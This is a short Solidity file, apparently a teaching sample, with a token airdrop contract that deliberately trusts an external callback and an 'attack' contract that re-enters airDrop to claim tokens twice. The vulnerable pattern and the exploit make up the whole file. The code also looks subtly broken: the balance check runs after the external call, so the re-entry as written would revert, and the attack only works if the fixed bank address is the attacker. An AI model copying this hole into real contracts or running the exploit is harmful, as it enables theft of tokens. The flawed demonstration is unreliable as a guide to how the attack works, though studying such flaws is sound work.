pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";
  Bank bank;

  constructor(address _bankAddress) public {
    bank = Bank(_bankAddress);
  }

  //If a contract has a zero balance and supports the token give them some token
  function airDrop() public {
    require(bank.supportsToken() == keccak256(abi.encodePacked(name)));
    require(tokenBalance[msg.sender] == 0);
    tokenBalance[msg.sender] += 20;
  }
}

contract Bank {
  function supportsToken() external pure returns(bytes32) {
    return(keccak256(abi.encodePacked("Nu Token")));
  }
}

contract attack { //An example of a contract that breaks the contract above.
  bool hasBeenCalled;
  function supportsToken() external returns(bytes32) {
    if(!hasBeenCalled) {
      hasBeenCalled = true;
      ModifierEntrancy(msg.sender).airDrop();
    }
    return(keccak256(abi.encodePacked("Nu Token")));
  }
  function call(address token) public {
    ModifierEntrancy(token).airDrop();
  }
}